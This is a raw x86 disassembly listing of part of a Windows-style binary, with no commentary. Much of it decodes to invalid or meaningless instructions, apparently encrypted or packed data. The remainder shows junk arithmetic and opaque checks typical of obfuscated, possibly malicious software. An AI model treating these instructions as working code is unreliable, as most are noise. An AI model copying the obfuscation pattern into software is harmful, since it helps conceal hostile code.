  41869f:	call   0x8d6c6f8
  4186a4:	not    DWORD PTR [esi]
  4186a6:	jnp    0x418632
  4186a8:	add    ch,BYTE PTR ds:0x7e0cb146
  4186ae:	iret   
  4186af:	pushf  
  4186b0:	dec    ebp
  4186b1:	aam    0x53
  4186b3:	cmp    eax,0x95f15e3a
  4186b8:	dec    eax
  4186b9:	rol    BYTE PTR [ebx+0x727052fd],0x3a
  4186c0:	lahf   
  4186c1:	xor    dh,bh
  4186c3:	jl     0x4186a6
  4186c5:	cs icebp 
  4186c7:	pusha  
  4186c8:	and    al,0xa4
  4186ca:	cdq    
  4186cb:	leave  
  4186cc:	xor    al,0x4a
  4186ce:	jno    0x41865f
  4186d0:	iret   
  4186d1:	arpl   WORD PTR ds:0x399ef49,di
  4186d7:	xor    eax,0xb6fb0284
  4186dc:	cwde   
  4186dd:	mov    esp,0xfb287bae
  4186e2:	shr    cl,0xcd
  4186e5:	fcomp  DWORD PTR [edx-0x43cfa2d8]
  4186eb:	mov    ?,WORD PTR [edi+0x6e6bef57]
  4186f1:	xchg   BYTE PTR [eax],al
  4186f3:	mov    ah,0x22
  4186f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186f6:	jl     0x4186c0
  4186f8:	mul    DWORD PTR [edi+0x31]
  4186fb:	sub    dh,BYTE PTR [eax]
  4186fd:	adc    BYTE PTR [edi],bh
  4186ff:	in     al,0x17
  418701:	pop    ebx
  418702:	pop    edx
  418703:	jmp    0x4186bd
  418705:	jns    0x418755
  418707:	push   eax
  418708:	push   edx
  418709:	js     0x4186be
  41870b:	sub    al,0x0
  41870d:	dec    eax
  41870e:	mov    ah,0x7f
  418710:	cwde   
  418711:	or     DWORD PTR [esi],0x514f3105
  418717:	dec    ebx
  418718:	icebp  
  418719:	jmp    0xcdb67e72
  41871e:	jg     0x418799
  418720:	dec    ebp
  418721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418722:	sub    edx,DWORD PTR [ecx-0x3]
  418725:	jle    0x4186bf
  418727:	arpl   WORD PTR [ebp+0x7ac1eae2],bp
  41872d:	mov    ch,0x2f
  41872f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418730:	idiv   DWORD PTR [edx-0x75]
  418733:	rcr    DWORD PTR [ebp-0x4d27a96a],0x8e
  41873a:	sar    DWORD PTR [esi-0x61],1
  41873d:	inc    esp
  41873e:	inc    ebx
  41873f:	test   BYTE PTR [ecx-0x4f],0x75
  418743:	popf   
  418744:	pop    ebx
  418745:	fcomp  DWORD PTR [ecx+edi*2-0x3d]
  418749:	and    al,0x7e
  41874b:	inc    esp
  41874c:	jl     0x418791
  41874e:	imul   ebp,DWORD PTR [edx],0x25555737
  418754:	jmp    0xea91:0x7a195e3f
  41875b:	dec    ebx
  41875c:	mov    esp,0x21e1963a
  418761:	lds    ecx,FWORD PTR [eax-0x7fdb654c]
  418767:	pop    ss
  418768:	fist   WORD PTR [edx]
  41876a:	mov    ebx,0x91f2af09
  41876f:	pop    esi
  418770:	mov    dh,0x6
  418772:	mov    ebp,0x6ba3f0cf
  418777:	in     eax,dx
  418778:	inc    eax
  418779:	cmp    al,0xa3
  41877b:	mov    ch,0x1
  41877d:	push   ds
  41877e:	je     0x4187ac
  418780:	outs   dx,DWORD PTR ds:[esi]
  418781:	jp     0x41872e
  418783:	test   eax,0xf1f977f3
  418788:	mov    ebp,0x3454d77b
  41878d:	xor    DWORD PTR [edx],edx
  41878f:	xchg   ebx,eax
  418790:	dec    ebp
  418791:	pop    ebp
  418792:	mov    esi,0x5e6ce4ca
  418797:	int    0x25
  418799:	aas    
  41879a:	push   ecx
  41879b:	sbb    BYTE PTR [ebx],0x43
  41879e:	jecxz  0x418810
  4187a0:	iret   
  4187a1:	push   0x5f6931a9
  4187a6:	retf   0x10de
  4187a9:	in     eax,dx
  4187aa:	aas    
  4187ab:	push   ss
  4187ac:	ret    
  4187ad:	test   DWORD PTR fs:[eax-0x4],esi
  4187b1:	lods   eax,DWORD PTR ds:[esi]
  4187b2:	or     al,0x54
  4187b4:	jp     0x418782
  4187b6:	hlt    
  4187b7:	cwde   
  4187b8:	imul   BYTE PTR [ebx-0x48]
  4187bb:	(bad)  
  4187bc:	lods   al,BYTE PTR ds:[esi]
  4187bd:	push   0xffffffa7
  4187bf:	or     edx,edi
  4187c1:	std    
  4187c2:	mov    cl,0x6
  4187c4:	pop    edi
  4187c5:	cmc    
  4187c6:	add    edx,DWORD PTR [edx-0x4f96eee7]
  4187cc:	mul    edi
  4187ce:	and    al,0x44
  4187d0:	lods   al,BYTE PTR ds:[esi]
  4187d1:	sub    BYTE PTR [ebx-0x3c],dh
  4187d4:	aas    
  4187d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187d6:	gs loope 0x4187b1
  4187d9:	sub    DWORD PTR [eax+0x26],edx
  4187dc:	out    dx,eax
  4187dd:	popf   
  4187de:	push   cs
  4187df:	pop    eax
  4187e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187e1:	or     edx,DWORD PTR [bx+di-0x57c3]
  4187e6:	pop    eax
  4187e7:	lods   eax,DWORD PTR ds:[esi]
  4187e8:	jp     0x418860
  4187ea:	pop    edi
  4187eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187ec:	loop   0x418868
  4187ee:	ret    
  4187ef:	mov    bl,0xcd
  4187f1:	stos   BYTE PTR es:[edi],al
  4187f2:	add    ecx,0x3e
  4187f5:	(bad)
  4187f9:	scas   eax,DWORD PTR es:[edi]
  4187fa:	mov    edi,DWORD PTR [edi]
  4187fc:	add    DWORD PTR [ebx+0x43],ebp
  4187ff:	and    DWORD PTR [ebx],eax
  418801:	cld    
  418802:	jmp    0x4187f0
  418804:	fsubrp st(1),st
  418806:	xor    BYTE PTR [ecx-0x66],dh
  418809:	jecxz  0x418883
  41880b:	cdq    
  41880c:	out    dx,eax
  41880d:	jg     0x418860
  41880f:	popf   
  418810:	dec    esi
  418811:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418812:	and    DWORD PTR [ebp+ecx*2+0x5efd3475],esi
  418819:	mov    ch,0x14
  41881b:	popa   
  41881c:	inc    ebp
  41881d:	push   edi
  41881e:	or     al,0x26
  418820:	add    ah,BYTE PTR [esi-0x7d623f5]
  418826:	stc    
  418827:	ror    BYTE PTR [esi],1
  418829:	(bad)  
  41882a:	out    0x62,eax
  41882c:	bound  ecx,QWORD PTR [ebp+0x14]
  41882f:	repz jb 0x4187f9
  418832:	inc    esp
  418833:	mov    edx,0xbc896097
  418838:	lods   al,BYTE PTR ds:[esi]
  418839:	ja     0x418868
  41883b:	cmp    ch,bh
  41883d:	adc    eax,0x565658c6
  418842:	and    DWORD PTR [ebx],esi
  418844:	(bad)  
  418845:	outs   dx,DWORD PTR ds:[esi]
  418846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418847:	xchg   ecx,eax
  418848:	add    dh,bl
  41884a:	mov    bl,0x82
  41884c:	or     edi,DWORD PTR gs:[ebp-0x40278106]
  418853:	loopne 0x418847
  418855:	sub    DWORD PTR [esi],esp
  418857:	nop
  418858:	mov    dh,0x6e
  41885a:	sbb    DWORD PTR [ebx-0x67318adc],edx
  418860:	add    DWORD PTR [edi+eax*4-0x23],edi
  418864:	mov    ch,BYTE PTR [ecx-0x48fe17d5]
  41886a:	push   0x828627d2
  41886f:	daa    
  418870:	rol    DWORD PTR [edx+0x5f],0xd
  418874:	outs   dx,BYTE PTR ds:[esi]
  418875:	in     al,dx
  418876:	pop    edi
  418877:	sbb    al,0x68
  418879:	and    DWORD PTR [esi+0x52fe5914],ecx
  41887f:	inc    edi
  418880:	jle    0x4188b7
  418882:	jo     0x4188f7
  418884:	inc    edx
  418885:	sar    DWORD PTR [ecx-0x727ba2d3],0xb3
  41888c:	rcr    ebp,1
  41888e:	push   ds
  41888f:	and    BYTE PTR [edx+0x4bc1ec36],cl
  418895:	pop    edi
  418896:	jmp    0x418909
  418898:	mov    ds:0x85ecf3cf,eax
  41889d:	mov    ds:0xa6483acd,eax
  4188a2:	mov    ah,0x53
  4188a4:	cmp    DWORD PTR [edx-0x39],edi
  4188a7:	cmp    DWORD PTR [ecx-0x6e],ebp
  4188aa:	clc    
  4188ab:	mov    ch,0x1f
  4188ad:	and    al,0x62
  4188af:	jmp    0x4188f2
  4188b1:	jge    0x41885a
  4188b3:	push   cs
  4188b4:	mov    ebx,0x48244c8b
  4188b9:	or     DWORD PTR ds:0x42824b,0x42823b
  4188c3:	xor    eax,ecx
  4188c5:	adc    ecx,DWORD PTR ds:0x428163
  4188cb:	mov    ecx,DWORD PTR [esp+0x28]
  4188cf:	div    ecx
  4188d1:	adc    DWORD PTR ds:0x428253,0x4282ab
  4188db:	and    eax,0x100
  4188e0:	xor    DWORD PTR ds:0x42819f,0x4282a3
  4188ea:	or     eax,0x290
  4188ef:	xor    DWORD PTR ds:0x42824f,0x42838f
  4188f9:	push   DWORD PTR [eax-0x494a7887]
  4188ff:	xor    DWORD PTR ds:0x42828b,0x7154
  418909:	call   DWORD PTR ds:0x428db8
  41890f:	or     DWORD PTR ds:0x4282a3,0x6165
  418919:	dec    esi
  41891a:	jne    0x417913
  418920:	add    DWORD PTR ds:0x4283a7,edi
  418926:	mov    DWORD PTR [esp+0x18],0xca79a575
  41892e:	cmp    DWORD PTR ds:0x42832f,0x0
  418935:	mov    DWORD PTR ds:0x42830f,ebx
  41893b:	mov    DWORD PTR ds:0x428293,ebx
  418941:	mov    esi,DWORD PTR ds:0x428263
  418947:	mov    esi,0x63e7
  41894c:	jmp    0x4189b1
  418951:	mov    esi,0x7fb2
  418956:	cmp    DWORD PTR ds:0x42832f,0x0
  41895d:	jb     0x41898b
  418963:	push   0x4fb4
  418968:	call   DWORD PTR ds:0x428dfc
  41896e:	movzx  esi,WORD PTR ds:0x428333
  418975:	sbb    DWORD PTR ds:0x428173,esi
  41897b:	adc    DWORD PTR ds:0x42837f,0x5f0e
  418985:	xor    DWORD PTR ds:0x4283b7,ebx
  41898b:	mov    esi,DWORD PTR ds:0x428247
  418991:	xor    esi,DWORD PTR ds:0x428183
  418997:	mov    DWORD PTR ds:0x428247,esi
  41899d:	add    DWORD PTR ds:0x428257,0x2d72
  4189a7:	sbb    DWORD PTR ds:0x4283b3,0x7522
  4189b1:	mov    esi,0x9c1b89e8
  4189b6:	mov    DWORD PTR [esp+0x1c],esi
  4189ba:	and    DWORD PTR ds:0x42838b,0x42824b
  4189c4:	mov    DWORD PTR [esp+0x70],0xca79a571
  4189cc:	mov    DWORD PTR [esp+0x74],esi
  4189d0:	xor    DWORD PTR ds:0x428173,0xa7a
  4189da:	call   0x40aa10
  4189df:	cmp    DWORD PTR ds:0x42832b,0x0
  4189e6:	mov    edi,DWORD PTR ds:0x4282b3
  4189ec:	mov    edx,DWORD PTR ds:0x42823b
  4189f2:	not    edx
  4189f4:	jmp    0x418a47
  4189f9:	mov    DWORD PTR ds:0x4283b3,0x606f
  418a03:	mov    DWORD PTR ds:0x42818f,ebx
  418a09:	cmp    DWORD PTR ds:0x42832b,0x0
  418a10:	jle    0x418a3f
  418a16:	call   DWORD PTR ds:0x428e00
  418a1c:	adc    DWORD PTR ds:0x42816b,ebx
  418a22:	or     DWORD PTR ds:0x42826f,0x5c58
  418a2c:	xor    ecx,ecx
  418a2e:	add    ecx,DWORD PTR ds:0x42821f
  418a34:	mov    edx,DWORD PTR ds:0x428343
  418a3a:	sub    ecx,edx
  418a3c:	and    ecx,DWORD PTR [ecx+edx*1]
  418a3f:	sub    edi,edx
  418a41:	sbb    ecx,DWORD PTR ds:0x428333
  418a47:	lea    eax,[esp+0x44]
  418a4b:	mov    DWORD PTR [esp+0xc],eax
  418a4f:	lea    eax,[esp+0x60]
  418a53:	add    DWORD PTR ds:0x4282b7,edi
  418a59:	mov    DWORD PTR [esp+0x10],eax
  418a5d:	cmp    DWORD PTR ds:0x4283b3,0x0
  418a64:	mov    edx,0x1d6
  418a69:	mov    DWORD PTR ds:0x42828b,0x11c5
  418a73:	mov    DWORD PTR ds:0x4283a7,ecx
  418a79:	jmp    0x418ad0
  418a7e:	movzx  eax,WORD PTR ds:0x42816b
  418a85:	mov    eax,ds:0x4282ab
  418a8a:	cmp    DWORD PTR ds:0x4283b3,0x0
  418a91:	je     0x418ab0
  418a97:	push   0x2fa1
  418a9c:	call   DWORD PTR ds:0x428ea0
  418aa2:	or     edi,ecx
  418aa4:	sbb    edi,0x59b9
  418aaa:	sbb    edx,0x32c6
  418ab0:	xor    DWORD PTR ds:0x428383,0x4bc8
  418aba:	sub    DWORD PTR ds:0x428293,edi
  418ac0:	or     DWORD PTR ds:0x42828b,0x2abb
  418aca:	sbb    DWORD PTR ds:0x42837f,ebx
  418ad0:	mov    eax,ds:0x422568
  418ad5:	mov    eax,DWORD PTR [eax+0x1d8]
  418adb:	sbb    DWORD PTR ds:0x42818b,ebx
  418ae1:	jmp    0x418eb0
  418ae6:	js     0x418b42
  418ae8:	push   ebp
  418ae9:	xor    eax,0x1a781a3b
  418aee:	or     eax,0x3eb0b184
  418af3:	dec    ebx
  418af4:	mov    ebp,0x16cb9ab0
  418af9:	sbb    BYTE PTR [edx+edx*1+0x16e91818],bh
  418b00:	call   0x7e87:0x809f1131
  418b07:	test   bl,al
  418b09:	push   ss
  418b0a:	repnz cld 
  418b0c:	add    al,0x33
  418b0e:	and    al,0xf
  418b10:	jg     0x418b03
  418b12:	pushf  
  418b13:	mov    esp,gs
  418b15:	or     eax,0x6ec232a2
  418b1a:	ss das 
  418b1c:	jne    0x418b7e
  418b1e:	in     eax,0x34
  418b20:	pop    ecx
  418b21:	cmp    ah,BYTE PTR [ebx+ebx*4]
  418b24:	mov    dh,0x6a
  418b26:	push   esp
  418b27:	lea    ebp,ds:0x73a5ea1b
  418b2d:	fld    QWORD PTR gs:[ebx+0x1]
  418b31:	inc    ebp
  418b32:	jle    0x418aef
  418b34:	pop    esp
  418b35:	(bad)  
  418b36:	imul   edx,DWORD PTR [esi+ebp*8],0xc14cb794
  418b3d:	jb     0x418b9a
  418b3f:	ja     0x418b7d
  418b41:	and    al,0xe2
  418b43:	and    al,0xb1
  418b45:	mov    edx,0xc1351c6a
  418b4a:	nop
  418b4b:	xchg   esp,eax
  418b4c:	jecxz  0x418b2e
  418b4e:	jae    0x418b4b
  418b50:	xor    eax,DWORD PTR [edx]
  418b52:	sub    bh,bh
  418b54:	les    ecx,FWORD PTR [edi+0x458cc28b]
  418b5a:	add    al,0x52
  418b5c:	xchg   ebp,eax
  418b5d:	add    dl,dl
  418b5f:	xchg   ebp,eax
  418b60:	adc    eax,0xdb276584
  418b65:	mov    al,0xc9
  418b67:	mov    ah,0xf7
  418b69:	imul   esi,DWORD PTR [edx+eiz*4],0x6
  418b6d:	popa   
  418b6e:	mov    edi,0x3f3ed63b
  418b73:	push   edi
  418b74:	cmp    DWORD PTR [esi+0x5a],edi
  418b77:	(bad)  
  418b78:	sub    al,0x6e
  418b7a:	or     eax,0xf6ccbe42
  418b7f:	stos   BYTE PTR es:[edi],al
  418b80:	dec    edi
  418b81:	aaa    
  418b82:	retf   
  418b83:	push   ecx
  418b84:	sbb    BYTE PTR [edx-0x1a],bh
  418b87:	push   es
  418b88:	(bad)  
  418b89:	xchg   edx,eax
  418b8a:	mov    bh,0x85
  418b8c:	xchg   ecx,eax
  418b8d:	pop    ecx
  418b8e:	outs   dx,DWORD PTR ds:[esi]
  418b8f:	push   ds
  418b90:	ror    DWORD PTR cs:[ebx+0x37],1
  418b94:	add    edx,DWORD PTR [esi]
  418b96:	or     eax,0x4d9379d8
  418b9b:	cmp    ch,0x17
  418b9e:	loope  0x418b5a
  418ba0:	int3   
  418ba1:	das    
  418ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ba3:	sub    dh,BYTE PTR [esi]
  418ba5:	cld    
  418ba6:	(bad)  
  418ba7:	stos   BYTE PTR es:[edi],al
  418ba8:	jno    0x418bc8
  418baa:	push   0xfffffff9
  418bac:	ja     0x418b6c
  418bae:	int    0x5f
  418bb0:	out    0xa3,al
  418bb2:	rcr    bh,0x30
  418bb5:	enter  0xa6db,0x9a
  418bb9:	fmulp  st(4),st
  418bbb:	jl     0x418b6b
  418bbd:	aad    0x1
  418bbf:	ss scas al,BYTE PTR es:[edi]
  418bc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bc2:	jnp    0x418c1f
  418bc4:	pop    eax
  418bc5:	or     edx,ecx
  418bc7:	mov    ah,BYTE PTR [edi+0x121167d7]
  418bcd:	xchg   DWORD PTR [ebx],edi
  418bcf:	cmc    
  418bd0:	sbb    BYTE PTR ds:0xdc5899af,al
  418bd6:	jecxz  0x418c18
  418bd8:	ret    0x8417
  418bdb:	xor    ch,al
  418bdd:	aaa    
  418bde:	push   edi
  418bdf:	push   edx
  418be0:	pop    ss
  418be1:	mov    ds:0xa7c8ea25,al
  418be6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418be7:	ret    0xe47b
  418bea:	nop
  418beb:	xlat   BYTE PTR ds:[ebx]
  418bec:	pop    ebx
  418bed:	xor    al,0x64
  418bef:	pop    ecx
  418bf0:	std    
  418bf1:	dec    eax
  418bf2:	ror    DWORD PTR [esi],cl
  418bf4:	out    0x66,al
  418bf6:	test   DWORD PTR [eax+ebp*2],edi
  418bf9:	cwde   
  418bfa:	gs loop 0x418c69
  418bfd:	or     BYTE PTR [edi],0x3b
  418c00:	clc    
  418c01:	ins    BYTE PTR es:[edi],dx
  418c02:	out    0xad,eax
  418c04:	sub    eax,DWORD PTR [edi-0x5b]
  418c07:	mov    eax,ds:0xba95d00e
  418c0c:	push   edi
  418c0d:	imul   ebp,DWORD PTR [ebx],0x7e
  418c10:	push   esi
  418c11:	(bad)  
  418c13:	mov    ax,0x95e8
  418c17:	repz jcxz 0x418c19
  418c1b:	or     DWORD PTR [esi+edx*8+0x5],ebp
  418c1f:	add    BYTE PTR [edi-0x5f21d4ac],cl
  418c25:	push   esi
  418c26:	sub    BYTE PTR [edi+0x5f2a0685],dh
  418c2c:	sub    BYTE PTR [edx+edi*4-0x2e],ch
  418c30:	test   eax,0xde2dda02
  418c35:	jecxz  0x418c47
  418c37:	out    0xce,eax
  418c39:	repnz stos BYTE PTR es:[edi],al
  418c3b:	add    eax,DWORD PTR [edx-0x4d]
  418c3e:	test   al,0x7c
  418c40:	pushw  ds
  418c42:	mov    esp,0x30ba27f
  418c47:	aad    0x84
  418c49:	xchg   esp,eax
  418c4a:	lds    ecx,FWORD PTR gs:[ebx-0x3dd5e625]
  418c51:	xor    edx,esp
  418c53:	jle    0x418cca
  418c55:	push   ds
  418c56:	je     0x418cbc
  418c58:	gs hlt 
  418c5a:	inc    ebp
  418c5b:	outs   dx,BYTE PTR ds:[esi]
  418c5c:	push   edi
  418c5d:	mov    ch,cl
  418c5f:	sahf   
  418c60:	ja     0x418ccc
  418c62:	xor    ebp,DWORD PTR [edi]
  418c64:	lods   eax,DWORD PTR ds:[esi]
  418c65:	sti    
  418c66:	mov    esp,0x2298f3be
  418c6b:	and    DWORD PTR [eax+edx*8-0x608d3797],ebp
  418c72:	mov    dl,0xca
  418c74:	or     DWORD PTR [eax+0x2f7e730a],ebp
  418c7a:	adc    BYTE PTR [eax+ecx*4+0x47d2cbdc],bl
  418c81:	sbb    DWORD PTR [ebx+0x34],eax
  418c84:	mov    ecx,0x45c361ce
  418c89:	or     edx,DWORD PTR [esi+0x25]
  418c8c:	loop   0x418c20
  418c8e:	xchg   ebp,eax
  418c8f:	sti    
  418c90:	jmp    0x92eca063
  418c95:	inc    edi
  418c96:	arpl   bp,ax
  418c98:	mov    edi,0x5be93f3d
  418c9d:	pop    ebp
  418c9e:	sbb    eax,0xff09d703
  418ca3:	xor    edx,ebp
  418ca5:	lock aad 0xe9
  418ca8:	mov    dl,0x3a
  418caa:	pushf  
  418cab:	push   edi
  418cac:	setno  BYTE PTR [ecx+0x6e7d1d40]
  418cb3:	mov    edx,0xf89bf2bc
  418cb8:	call   0x8aaba58b
  418cbd:	xor    eax,0xb2c6a3ee
  418cc2:	pusha  
  418cc3:	cmp    al,0xc
  418cc5:	popa   
  418cc6:	test   eax,0xd270d75f
  418ccb:	push   ds
  418ccc:	cmp    eax,0xc44f0775
  418cd1:	jmp    0x658d:0x94ee4da7
  418cd8:	pop    edi
  418cd9:	push   ds
  418cda:	mov    bl,BYTE PTR [edx-0x3f]
  418cdd:	fwait
  418cde:	cmp    al,0xdf
  418ce0:	in     al,dx
  418ce1:	int3   
  418ce2:	and    DWORD PTR [eax],edi
  418ce4:	adc    eax,0x78b2d8f2
  418ce9:	mov    bh,0x47
  418ceb:	mov    esp,0xa3b51dc3
  418cf0:	inc    edx
  418cf1:	cmp    cl,BYTE PTR [ebp-0xf]
  418cf4:	mov    cl,0x5
  418cf6:	ret    0xf42e
  418cf9:	enter  0x4545,0xc7
  418cfd:	xchg   esp,eax
  418cfe:	adc    edx,DWORD PTR [ebx*2-0x3c4aa2d2]
  418d05:	mov    edi,0x3befea8e
  418d0a:	test   ebx,eax
  418d0c:	fadd   QWORD PTR [eax+ebp*8]
  418d0f:	mov    ebx,0x3a284473
  418d14:	jecxz  0x418d7c
  418d16:	xor    DWORD PTR [ebp+0x59c27985],0xffffff86
  418d1d:	pop    esp
  418d1e:	mov    ds:0x6ad1c2df,eax
  418d23:	iret   
  418d24:	inc    esp
  418d25:	mov    esi,0xc955b47f
  418d2a:	aam    0xe3
  418d2c:	sbb    eax,0x8e029a8
  418d31:	cmp    BYTE PTR [ebx+0x20],al
  418d34:	and    al,0xfe
  418d36:	dec    ebx
  418d37:	int3   
  418d38:	xchg   DWORD PTR [ecx+0x15],ebx
  418d3b:	and    al,0x24
  418d3d:	pop    ss
  418d3e:	fidivr WORD PTR [eax+esi*2]
  418d41:	xor    DWORD PTR [ebp+0x46f05cab],edx
  418d47:	daa    
  418d48:	(bad)  
  418d49:	repnz lahf 
  418d4b:	mov    dh,0xa
  418d4d:	jo     0x418daf
  418d4f:	mov    bl,0x7c
  418d51:	and    ch,BYTE PTR [ebx-0x18]
  418d54:	inc    esp
  418d55:	je     0x418d82
  418d57:	inc    ecx
  418d58:	jg     0x418cdf
  418d5a:	ins    DWORD PTR es:[edi],dx
  418d5b:	add    eax,0xe7dd1783
  418d60:	sbb    DWORD PTR [ebx-0x48f5bd88],esp
  418d66:	push   0xed2f8363
  418d6b:	mov    edi,0x88efa359
  418d70:	ds xor ebp,edi
  418d73:	out    0x4d,eax
  418d75:	ds inc ecx
  418d77:	push   edi
  418d78:	pop    esi
  418d79:	call   0xbfa5:0x18ee815
  418d80:	rcr    BYTE PTR [edi],1
  418d82:	loope  0x418dc3
  418d84:	cmp    cl,dl
  418d86:	jl     0x418dbb
  418d88:	mov    eax,ds:0x23f78028
  418d8d:	dec    eax
  418d8e:	stos   DWORD PTR es:[edi],eax
  418d8f:	push   ecx
  418d90:	in     eax,dx
  418d91:	jbe    0x418d88
  418d93:	into   
  418d94:	inc    esp
  418d95:	add    al,0xde
  418d97:	and    ebp,ebx
  418d99:	scas   al,BYTE PTR es:[edi]
  418d9a:	push   ss
  418d9b:	out    0xc,eax
  418d9d:	lahf   
  418d9e:	test   eax,0x2fe5dc63
  418da3:	mov    ?,WORD PTR [ebx]
  418da5:	cld    
  418da6:	rcr    edx,0x5b
  418da9:	int    0x7b
  418dab:	movlps xmm5,QWORD PTR [ebp-0x77]
  418daf:	hlt    
  418db0:	push   0x139fdeb0
  418db5:	push   0x1
  418db7:	sub    al,cl
  418db9:	gs xchg edx,eax
  418dbb:	cmc    
  418dbc:	hlt    
  418dbd:	stos   DWORD PTR es:[edi],eax
  418dbe:	sub    dh,ch
  418dc0:	lea    eax,[eax+0x4b]
  418dc3:	test   BYTE PTR [eax],bl
  418dc5:	sbb    DWORD PTR [eax+0x670ccf95],edx
  418dcb:	pop    ebx
  418dcc:	dec    edx
  418dcd:	push   esp
  418dce:	push   esi
  418dcf:	test   eax,0x923b636f
  418dd4:	scas   al,BYTE PTR es:[edi]
  418dd5:	sahf   
  418dd6:	or     al,0x4d
  418dd8:	jle    0x418d71
  418dda:	pop    esi
  418ddb:	ret    
  418ddc:	pop    esp
  418ddd:	jno    0x418dab
  418ddf:	dec    esp
  418de0:	xchg   edx,eax
  418de1:	push   ss
  418de2:	adc    dl,ch
  418de4:	pop    esp
  418de5:	cli    
  418de6:	xor    ecx,DWORD PTR [edx-0x4332354e]
  418dec:	sbb    DWORD PTR [ebx],esi
  418dee:	sub    BYTE PTR [ebx+0x1],bl
  418df1:	xchg   ebx,esp
  418df3:	ret    
  418df4:	fsub   DWORD PTR [ebx-0x5efc8f1]
  418dfa:	mov    edx,0xf91be81c
  418dff:	add    eax,0xd281c8bf
  418e04:	or     BYTE PTR [ebp+eiz*1-0xf],dh
  418e08:	bound  edi,QWORD PTR gs:[esi+0x2b]
  418e0c:	dec    eax
  418e0d:	out    dx,al
  418e0e:	ja     0x418e2e
  418e10:	mov    ah,0xb0
  418e12:	and    DWORD PTR [ebp+0x7d78d3cf],edx
  418e18:	xor    ebx,DWORD PTR [edi-0x2023957c]
  418e1e:	push   ebp
  418e1f:	jg     0x418db6
  418e21:	pop    esp
  418e22:	mov    ah,0x67
  418e24:	popa   
  418e25:	mov    bh,0xb3
  418e27:	ins    BYTE PTR es:[edi],dx
  418e28:	stos   DWORD PTR es:[edi],eax
  418e29:	mov    edi,0xa01dd314
  418e2e:	mov    ds:0x7efa3804,al
  418e33:	mov    eax,0x446d4ec9
  418e38:	dec    ebp
  418e39:	mov    BYTE PTR [edx+0x29],0x97
  418e3d:	ds jmp 0xaa7f938b
  418e43:	dec    esp
  418e44:	arpl   WORD PTR [esi+eiz*8+0x583c8484],si
  418e4b:	mov    cl,0x1f
  418e4d:	or     ecx,DWORD PTR [ebp-0x54]
  418e50:	mov    WORD PTR [ebx+0x68],ds
  418e53:	jmp    0x5f0c9708
  418e58:	les    edx,FWORD PTR [edx+0x1b]
  418e5b:	add    DWORD PTR ds:0x58c9ec8a,0xffffffe2
  418e62:	cmp    al,0xf9
  418e64:	mov    bh,0xdc
  418e66:	push   es
  418e67:	push   0x4c9d7820
  418e6c:	sti    
  418e6d:	shl    DWORD PTR ds:0xf1e99b4c,cl
  418e73:	leave  
  418e74:	out    0x74,eax
  418e76:	xor    DWORD PTR [esi+edx*2+0x74a397f3],0x74512232
  418e81:	ins    DWORD PTR es:[edi],dx
  418e82:	fnsave [edx+0x4b]
  418e85:	ficom  DWORD PTR [ebx]
  418e87:	out    dx,al
  418e88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e89:	push   esp
  418e8a:	dec    eax
  418e8b:	dec    edx
  418e8c:	iret   
  418e8d:	arpl   WORD PTR [ebp-0x33],dx
  418e90:	push   esp
  418e91:	loop   0x418ede
  418e93:	cmc    
  418e94:	or     al,0x46
  418e96:	icebp  
  418e97:	pop    ebx
  418e99:	push   es
  418e9a:	and    ecx,DWORD PTR [ebx+edx*8]
  418e9d:	jp     0x418efb
  418e9f:	push   ecx
  418ea0:	add    eax,0xbcb4ac48
  418ea5:	xlat   BYTE PTR ds:[ebx]
  418ea6:	jb     0x418e45
  418ea8:	retf   0xc69f
  418eab:	mov    esi,0xe6ee83d
  418eb0:	mov    eax,DWORD PTR [eax]
  418eb2:	and    ecx,ecx
  418eb4:	mov    ecx,eax
  418eb6:	xor    ecx,0xa4069aaf
  418ebc:	cmp    DWORD PTR ds:0x4283af,0x0
  418ec3:	mov    DWORD PTR ds:0x428177,0x216c
  418ecd:	mov    DWORD PTR ds:0x42827b,0x28e7
  418ed7:	mov    DWORD PTR ds:0x428273,0x19fa
  418ee1:	jmp    0x418f4e
  418ee6:	mov    DWORD PTR ds:0x428283,0x562c
  418ef0:	mov    DWORD PTR ds:0x4282ab,0x3af5
  418efa:	cmp    DWORD PTR ds:0x4283af,0x0
  418f01:	jae    0x418f2c
  418f07:	push   0x615d
  418f0c:	push   0x428337
  418f11:	push   DWORD PTR [ebp-0x28]
  418f14:	call   DWORD PTR ds:0x428e04
  418f1a:	not    DWORD PTR ds:0x4281ab
  418f20:	sub    DWORD PTR ds:0x42839f,0x3f9
  418f2a:	adc    edx,edx
  418f2c:	sub    edi,DWORD PTR ds:0x428163
  418f32:	mov    edx,DWORD PTR ds:0x4282a7
  418f38:	sbb    DWORD PTR ds:0x42838b,edx
  418f3e:	xor    edi,edi
  418f40:	or     edi,DWORD PTR ds:0x4282e3
  418f46:	mov    edi,DWORD PTR [edi]
  418f48:	and    DWORD PTR ds:0x42831b,edi
  418f4e:	xor    eax,0xfffffffe
  418f51:	and    DWORD PTR ds:0x42839f,edi
  418f57:	shl    eax,0x1e
  418f5a:	shr    ecx,0x2
  418f5d:	sbb    DWORD PTR ds:0x4283b3,edi
  418f63:	or     ecx,eax
  418f65:	cmp    DWORD PTR ds:0x42830b,0x0
  418f6c:	not    DWORD PTR ds:0x428277
  418f72:	not    DWORD PTR ds:0x4281a7
  418f78:	mov    DWORD PTR ds:0x4282ff,0x4dce
  418f82:	mov    edx,0xaa6
  418f87:	jmp    0x418fde
  418f8c:	mov    eax,ds:0x42832f
  418f91:	mov    eax,0x4392
  418f96:	cmp    DWORD PTR ds:0x42830b,0x0
  418f9d:	jae    0x418fc8
  418fa3:	push   0x4547
  418fa8:	push   0x4fda
  418fad:	push   DWORD PTR [ebp-0x1c]
  418fb0:	push   0x42838b
  418fb5:	call   DWORD PTR ds:0x428e08
  418fbb:	inc    edx
  418fbc:	or     DWORD PTR ds:0x42823f,ebx
